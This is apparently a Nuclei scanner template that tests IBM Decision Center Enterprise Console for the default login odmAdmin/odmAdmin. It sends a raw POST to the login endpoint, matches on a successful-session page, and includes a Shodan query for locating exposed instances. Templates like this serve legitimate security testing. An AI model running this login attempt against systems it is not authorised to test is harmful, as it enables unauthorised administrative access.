id: ibm-dcec-default-login

info:
  name: IBM Decision Center Enterprise Console - Default Login
  author: DhiyaneshDK
  severity: high
  reference:
    - https://www.ibm.com/docs/en/odm/8.5.1?topic=console-tutorial-getting-started-decision-center-enterprise
  metadata:
    verified: true
    max-request: 1
    shodan-query: "html=\"Decision Center Enterprise console\""
  tags: ibm,default-login,decision-center,vuln

http:
  - raw:
      - |
        POST /teamserver/j_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        j_username={{username}}&j_password={{password}}

    host-redirects: true
    max-redirects: 3

    attack: pitchfork
    payloads:
      username:
        - odmAdmin
      password:
        - odmAdmin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Current action:"
          - "Sign Out"
        condition: and

      - type: status
        status:
          - 200
